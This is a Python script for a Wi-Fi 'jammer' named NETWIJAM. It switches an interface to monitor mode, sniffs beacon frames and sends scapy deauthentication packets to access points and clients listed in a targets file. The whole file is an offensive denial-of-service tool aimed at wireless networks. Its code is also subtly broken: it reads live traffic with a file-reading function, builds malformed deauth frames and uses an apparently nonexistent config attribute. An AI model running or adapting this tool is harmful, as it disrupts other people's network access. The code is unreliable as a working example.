import os
import sys
import time
import logging
from scapy.all import *
import threading
import signal

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Red banner with tool name and version
def print_banner():
    print("\033[91m" + """
     ____  ____  ____  _  __      ____  ____  _  __
    |  _ \|  _ \|  _ \| |/ /     |  _ \|  _ \| |/ /
    | |_) | |_) | |_) | ' /      | |_) | |_) | ' /
    |  __/|  _ <|  _ <| . \      |  __/|  _ <| . \
    |_|   |_| \_\_| \_\_|\_\     |_|   |_| \_\_|\_\

    NETWIJAM - Network and Wi-Fi Jammer
    Version: 1.1
    """ + "\033[0m")

def print_animation():
    animations = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for animation in animations:
        print(f"\rJamming Wi-Fi and Networks... {animation}", end="", flush=True)
        time.sleep(0.1)

def set_monitor_mode(iface):
    try:
        os.system(f'sudo ifconfig {iface} down')
        os.system(f'sudo iwconfig {iface} mode monitor')
        os.system(f'sudo ifconfig {iface} up')
        logging.info(f"Set {iface} to monitor mode")
    except Exception as e:
        logging.error(f"Failed to set {iface} to monitor mode: {e}")
        sys.exit(1)

def jam_networks(iface, targets):
    while True:
        try:
            packets = rdpcap(iface, timeout=1)
            for packet in packets:
                if packet.haslayer(Dot11):
                    dot11 = packet[Dot11]
                    if dot11.type == 0 and dot11.subtype == 8:  # Beacon frame
                        addr2 = dot11.addr2
                        logging.info(f"Detected AP: {addr2}")
                        if addr2 in targets:
                            send_deauth_packets(iface, addr2)

                    # Also send deauth packets to all clients
                    if dot11.addr2 not in [dot11.addr1, dot11.addr3] and dot11.addr2 in targets:
                        send_deauth_packets(iface, dot11.addr2)

            time.sleep(1)
        except Exception as e:
            logging.error(f"Error capturing packets: {e}")
            time.sleep(5)

def send_deauth_packets(iface, addr):
    try:
        sendp(Dot11Deauth(addr1=conf.ifaddr, addr2=addr, addr3=conf.ifaddr), iface=iface, count=10)
        logging.info(f"Sent deauth packets to {addr}")
    except Exception as e:
        logging.error(f"Failed to send deauth packets to {addr}: {e}")

# Removed the incorrect line
def handle_signal(sig, frame):
    logging.info("Shutting down gracefully...")
    sys.exit(0)

def main():
    if os.geteuid() != 0:
        logging.error("This script must be run as root")
        sys.exit(1)

    print_banner()

    iface = input("Enter your Wi-Fi interface name (e.g., wlan0): ")
    set_monitor_mode(iface)

    # Read targets from configuration file
    with open('targets.txt', 'r') as file:
        targets = file.read().splitlines()

    # Start the jamming process in a separate thread
    jam_thread = threading.Thread(target=jam_networks, args=(iface, targets))
    jam_thread.start()

    # Start the animation in the main thread
    animation_thread = threading.Thread(target=print_animation)
    animation_thread.start()

    # Register signal handler for graceful shutdown
    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    # Wait for the jamming thread to finish
    jam_thread.join()

    # Stop the animation
    print("\rJamming Wi-Fi and Networks... Done!")

if __name__ == "__main__":
    main()
    
